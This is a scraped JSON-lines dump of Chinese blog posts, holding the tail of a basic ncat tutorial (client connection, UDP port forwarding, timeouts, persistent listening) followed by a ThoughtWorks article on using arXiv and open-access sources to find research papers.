!important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat 192.168.1.100 10000</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29678060b404937386-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29678060b404937386-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10000</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3 id=\"toc_8\">例子： 8) 通过 <code>nc</code> 进行端口转发</h3>\n<p>我们通过选项 <code>-c</code> 来用 <code>nc</code> 进行端口转发，实现端口转发的语法为：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29678060e374443202\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -u -l  80 -c  'ncat -u -l 8080'</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29678060e374443202-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29678060e374443202-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">80</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\">  </span><span class=\"crayon-s\">'ncat -u -l 8080'</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>这样，所有连接到 80 端口的连接都会转发到 8080 端口。</p>\n<h3 id=\"toc_9\">例子： 9) 设置连接超时</h3>\n<p><code>nc</code> 的监听模式会一直运行，直到手工终止。 不过我们可以通过选项 <code>-w</code> 设置超时时间:<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f296780611662325803\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -w 10 192.168.1.100 8080</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f296780611662325803-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f296780611662325803-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这回导致连接 10 秒后终止，不过这个选项只能用于客户端而不是服务端。</p>\n<h3 id=\"toc_10\">例子： 10) 使用 <code>-k</code> 选项强制 <code>nc</code> 待命</h3>\n<p>当客户端从服务端断开连接后，过一段时间服务端也会停止监听。 但通过选项 <code>-k</code> 我们可以强制服务器保持连接并继续监听端口。 命令如下：<code> </code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f296780615655242528\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l -k 8080</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f296780615655242528-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f296780615655242528-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">k</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>现在即使来自客户端的连接断了也依然会处于待命状态。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113410\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113410votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113410\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "2"}
{"tags": "其他", "front_image_url": ["http://insights.thoughtworks.cn/wp-content/uploads/2018/01/500350520-1024x576.jpg"], "title": "免费知识哪里来？Arxiv 使用指南", "fav_nums": 0, "url": "http://blog.jobbole.com/113524/", "create_date": "2018/01/29", "url_object_id": "4e5a1f0a9df35564532b911089a9915e", "comment_nums": 0, "front_image_path": "full/b6904127059aff354b12d2cb953eb7733f8d9064.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><div>\n<p>如果你非常确定自己想要找什么，比如知道论文的名字（算法的名字）或者作者的名字，直接去Google Scholar上搜索是最快的。然而如果你并不是很确定自己想要什么，只是想要看看某个领域的最新发展，知道大家都在干什么，然而却发现Google Scholar给你的结果多半不靠谱，请读下去。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/500350520.jpg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/500350520-1024x576.jpg\" alt=\"\" width=\"700\" height=\"394\"></a></p>\n<h3>引子</h3>\n<p>最近半年，在我身上时常发生下面这类对话：</p>\n<blockquote><p>“Hey， 你知道XXXXXXXXXXXXX问题怎么解决吗？”</p>\n<p>“哦，我刚好读过两篇相关的论文，等下发给你。”</p>\n<p>……</p></blockquote>\n<p>尴尬的沉默，一般来说拿到文章之后对方就再也不会来找我了，虽然我是真心的想要交流，然而有一些好学的孩子会接着问：</p>\n<blockquote><p>“你的论文是哪里找到的呢？”</p></blockquote>\n<p>鉴于论文背景不同，我会丢一个链接过去——这个链接（网站）在大部分数学/物理/计算机/统计领域里面，都是<a href=\"https://arxiv.org/\">https://arxiv.org/</a>。</p>\n<h3>Arxiv是什么</h3>\n<p>arxiv设计的初衷是一群物理学家们想要交流自己将要发表的论文，可以想象一下，在上世纪九十年代，人们用的还是软盘（包括5.25吋软盘和3.5寸什么的，存储空间可以说以KB计算），邮箱也不例外，投稿高峰期分分钟几百个KB的邮箱就会被文章塞满。Paul Ginsparg一看这不行，论文如果想要很好的被分享并审核，大约是需要集中存储的，就在1991年于LANL（<a href=\"http://www.lanl.gov/\">http://www.lanl.gov/ </a>洛斯阿拉莫斯国家实验室）建立了arxiv的雏形，如下图所示。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/1-Arxiv.png\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/1-Arxiv.png\" alt=\"\" width=\"941\" height=\"504\"></a></p>\n<p>当时有个萌萌的域名：<a href=\"http://xxx.lanl.gov/\">http://xxx.lanl.gov/</a> ，到现在也可以被访问。不过由于LANL作为一个严谨的科学实验室实在是懒得运营这个网站，后来就被康奈尔大学接管支持。</p>\n<p>然而，今天当我们谈到arxiv，就不能不说Open Access【开放获取】。 我们都知道，以前看文章是要钱的，直到今天，看大部分的文章也是要钱的。如下图所示，看一篇Nature一般要20美元，折合100多人民币。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/2-Open-Access.png\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/2-Open-Access.png\" alt=\"\" width=\"941\" height=\"727\"></a></p>\n<p>这个价格吧，说贵不贵说便宜不便宜，在大部分有钱公司和牛逼学校买个site license或者报个销都是不成问题的，但是对那些有科研兴趣的个人或者是那些落后地区的学校，就很成问题了。像马拉维啊中非啊这种国家，到2016年，官方数据中人均GDP才400美刀（大约20篇文章），你让人家怎么玩嘛。难道要让知识像财富一样集中在少数人手里么？</p>\n<p>就好像我们一直希望互联网拥有中立性（电信运营商、有线电视公司等互联网服务提供商应当平等地对待所有通过他们网络的流量，网络服务提供商有区别地对待不同的流量可能会使大公司能够限制消费者的自由）一样，我们并不希望因为钱而阻挡了知识的传播。 所以，我们有了<a href=\"http://www.budapestopenaccessinitiative.org/read\">布达佩斯宣言</a>:</p>\n<blockquote><p>There are many degrees and kinds of wider and easier access to this literature. By ‘open access’ to this literature, we mean its free availability on the public internet, permitting any users to read, download, copy, distribute, print, search, or link to the full texts of these articles, crawl them for indexing, pass them as data to software, or use them for any other lawful purpose, without financial, legal, or technical barriers other than those inseparable from gaining access to the internet itself. The only constraint on reproduction and distribution, and the only role for copyright in this domain, should be to give authors control over the integrity of their work and the right to be properly acknowledged and cited.</p></blockquote>\n<p>作为开放获取的先驱者，我们要为arxiv——这一开放获取的先驱鼓掌！为我们带来的好处就是，免费！免费！免费！</p>\n<p>基于我的个人访问经验，大家如果想知道都有哪些杂志或者期刊提供免费的资源，可以参考这个列表：<a href=\"https://en.wikipedia.org/wiki/List_of_open_access_journals\">https://en.wikipedia.org/wiki/List_of_open_access_journals</a> 图中是“数学”类目下提供开放获取的期刊。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/3-mathematics.png\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/3-mathematics.png\" alt=\"\" width=\"941\" height=\"602\"></a></p>\n<p><strong>实在找不到免费文章咋办？</strong></p>\n<p>我一般会直接发邮件问作者要，顺便聊聊自己的研究领域以及跟这篇文章相关的几个最新问题，成功率还是蛮高的，还可能交到好朋友。</p>\n<p>说到Arxiv还有一样不能不说的就是LaTex——个人认为最美的文本编辑器（或者语言？），只是从学术圈儿跳出来之后发现大家好像都懒得用，在此由于篇幅所限，不再赘述。</p>\n<h3>Arxiv有什么</h3>\n<p>由于各种历史原因，Arxiv中文献的主要研究领域还是数理哲学，包括数学/物理/计算机/统计/天文/定量生物/定量金融等领域。截止到2016年的发表量统计可以参考下面这张图。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/4-Arxiv.png\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/4-Arxiv.png\" alt=\"\" width=\"941\" height=\"481\"></a></p>\n<p>左图中是每年新提交的文章数目，右图是每年的发表量所占百分比（总和为1）， “hep-“代表高能物理学，(hep-th+hep-ph+hep-lat+hep-ex), “cond-mat” 代表凝聚态物理学, “astro-ph” = 天体物理学, “math” 代表数学, “other physics” 表示物理学的其他领域（ physics+nucl+gr-qc+quant-ph+nlin） “biology” 指的是量化生物学，“finance” 指的是量化金融，“cs”指的是计算机科学。</p>\n<p>我们可以看到，在2002年之前，计算机科学领域的占比几乎可以忽略不计，然而到2016年已然占据了近五分之一，并且还在以极快的速度增长。而1992至1996年间占据了大半江山的高能物理学，到了今天地盘几乎被蚕食殆尽，只剩约10%的份额苟延残喘。沧海桑田，可见一斑。</p>\n<p>还有论文发表总量如下图：</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/5-Arxiv.png\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/5-Arxiv.png\" alt=\"\" width=\"941\" height=\"427\"></a></p>\n<p>（信息来自：<a href=\"https://arxiv.org/help/stats/2016_by_area/index\">https://arxiv.org/help/stats/2016_by_area/index</a> ）</p>\n<p>从图中，我们可以清楚的发现三个事情：</p>\n<ol>\n<li>所有论文发表量都在时间轴上爆发式的增长，在上面这张历史发表总量图中体现的尤为明显；</li>\n<li>数学一家独大，不管是在年度发表量还是历史发表总量上；</li>\n<li>计算机（cs）在历史发表总量中只占了8.3%，然而2016年的提交量占了18.3%，结合提交数量图的分析，真是长势喜人、值得期待。</li>\n<li>每个月近10000篇文章提交（正式接受的会少一些，如果精准到感兴趣的垂直领域会更少）。</li>\n</ol>\n<p>那么，不想只关心数理领域的咋办？</p>\n<p>很简单，就好像任何市场一样，arxiv火了之后大批人跟风，所以我们现在有了生物学版本arxiv <a href=\"https://www.biorxiv.org/\">https://www.biorxiv.org/</a>，心理学版本arxiv <a href=\"https://psyarxiv.com/\">https://psyarxiv.com/</a> ，等等等等。当然，知识的沉淀往往需要时间，这些垂直领域的“arxiv”们到目前为止还不是非常成熟，所以我仍然建议大家结合上文提到的Open Access列表里的机构，去寻找想要的免费资源。</p>\n<h3>Arxiv怎么用</h3>\n<p>就像我在本文开头提到的那样，这个引擎最大的效果是当你并不确定自己想要什么的时候，去看看领域的最新发展，知道大家都在干什么。它最大的好处是值得信任。 当然，同样值得信任的还有很多——虽然它们大部分都要钱，针对大多数期刊们，可以按照影响因子从大往小排个序（众所周知，影响因子这个评定标准就像高考成绩一样非常片面，然而这也是目前最普遍的解决方案了），前文中提到的Nature系列和Science系列，都非常值得信任。不做赘言。</p>\n<p>很高兴的一点是，收费（还收的比较贵的）基本都是期刊，然而与其他领域尤其是生物学方向不太一样，计算机方向最顶级的往往是会议而不是期刊，而会议往往是不收费的！这里举个例子，International Conference on Machine Learning 【ICML】，机器学习方面的顶级会议之一，其中所有的文章都可以在下面的链接里找到。<a href=\"https://icml.cc/Conferences/2017/Schedule?type=Poster\">https://icml.cc/Conferences/2017/Schedule?type=Poster</a></p>\n<p>太幸福了！——这个也是我最最最推荐大家找到值得读的文章的办法：盯着领域著名会议列表刷（虽然有个缺点，就是刷到啥算啥）。</p>\n<p>但是，往往新入门的人往往没有办法靠关键字搜索【看脸】来分辨哪个期刊哪个会议才是真正有价值的。每年的会议不知凡几，我在wikiCFP上随便搜了一下人工智能，在接下来一年内仅仅这个垂直领域就有3130个会议。平心而论，有多少是真正有价值的呢？每个会议按照50篇paper来算，15万篇paper，一个人类就是不吃不睡不工作全职看一年paper，能看几篇？</p>\n<p>当然，据个人经验，关于计算机方向的会议排名，大家可以参考下面的链接 <a href=\"https://www.aminer.cn/ranks/conf\">https://www.aminer.cn/ranks/conf</a> ，我截取了AI/PR (人工智能/模式识别）领域排名靠前的一段，如下图。有想看计算机视觉的可以参考里面带”vision”的，具体会议的分析和比较将另文分析，这里不做赘言。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/6.png\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/6.png\" alt=\"\" width=\"941\" height=\"546\"></a></p>\n<p>但是，如果不想这样盯着列表一个一个会议慢慢看下来呢？如果就是想要找一下某个主题或者关键字呢？或者就是想要知道这个月出现了什么新算法呢？——会议可都是一年一次的。 这个时候，就是arxiv大放异彩的时候了。它给了我们一个更集中的搜索平台，而且相对来说更值得信任（反正比起来什么都可以搜索的Google Scholar，用户要筛选的噪声少了很多）。</p>\n<p>没有证据都是耍流氓？ 请点开下面这个链接 <a href=\"https://arxiv.org/list/cs.LG/recent\">https://arxiv.org/list/cs.LG/recent</a>，这是对Machine Learning领域的一个搜索。仅仅看这一页简介那些熟悉的作者名字，就知道大部分都不会让你失望的。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/7.png\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/7.png\" alt=\"\" width=\"941\" height=\"519\"></a></p>\n<p>尽管arxiv定位是preprint，但其中也囊括了各种已经被NIPS，AAAI等等行业顶级会议接受的文章。而且，所有这些，都有直接的pdf原文可以免费下载。搜索和筛选成本都低到极致。同时，只需要点击感兴趣的作者名字，所有他发表过的文章都会被列出来（如下图中的Lei Shu），而完全不用担心其他搜索引擎中常常发生的同名同姓作者的麻烦——这一点相信搜索过中文名拼音的都深有体会——张王李赵遍天下绝对不是说说的。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/8.png\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/8.png\" alt=\"\" width=\"941\" height=\"585\"></a></p>\n<p>得数据库如此，夫复何求？</p>\n<p>作为对比，下面是我在Google Scholar同样搜索Machine Learning关键字得到的结果。大家可以自行体会时效性，相关度和质量。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/9.png\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/9.png\" alt=\"\" width=\"941\" height=\"385\"></a></p>\n<p>当然，时效性这个可以通过点击左手边的“Sort by date”来解决，然而点击了之后是这个样子的：</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/10.png\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/10.png\" alt=\"\" width=\"941\" height=\"515\"></a></p>\n<p>——反正前面Springer家的都是要钱的，质量不提，单单是能下载的pdf也真的不常有。</p>\n<p>更重要的是，google作为跨平台老牌全网搜索引擎，看到某个关键字的时候并不会针对特殊的领域进行搜索，所以大批量主题无关的文章（不信的可以搜一下lenet，vgg这类，看看搜索结果），就会干扰搜索结果。</p>\n<p>所以，当你要找的参考文献属于数理领域尤其是AI/ML/Stat相关，而Google Scholar又没能给你满意的结果（又或者很贵），就试试看arxiv吧！</p>\n<div></div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113524\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113524votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113524\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">\r\n\t\t\t<img src=\"http://tp3.sinaimg.cn/1774908135/180/0/1\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            ThoughtWorks是一家全球IT咨询公司，追求卓越软件质量，致力于科技驱动商业变革。擅长构建定制化软件产品，帮助客户快速将概念转化为价值。同时为客户提供用户体验设计、技术战略咨询、组织转型等咨询服务。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/thoughtworkschina\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/thoughtworkschina/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 78</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://insights.thoughtworkers.org/\"><i 